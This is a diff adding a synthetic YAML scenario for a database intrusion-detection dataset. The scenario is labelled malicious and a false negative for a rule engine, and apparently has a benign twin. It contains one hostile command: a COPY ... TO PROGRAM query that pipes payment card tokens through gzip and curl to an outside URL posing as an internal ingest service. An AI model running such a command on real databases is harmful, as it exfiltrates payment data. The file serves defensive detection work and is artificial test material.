@@ -1,0 +1,30 @@
+scenario_id: gen_ecommerce_68_copy_to_program_mal_1994m
+family_id: gen_ecommerce_68_copy_to_program_fam_1994
+domain: ecommerce
+time_of_day: 00:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT card_token, card_last4 FROM payments) TO PROGRAM 'gzip | curl
+      -sX POST https://etl-internal.corp/ingest --data-binary @-'
+    connects_to:
+      ip: 192.168.15.221
+      port: 22
+matched_pair_id: gen_ecommerce_68_copy_to_program_pair_1994
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
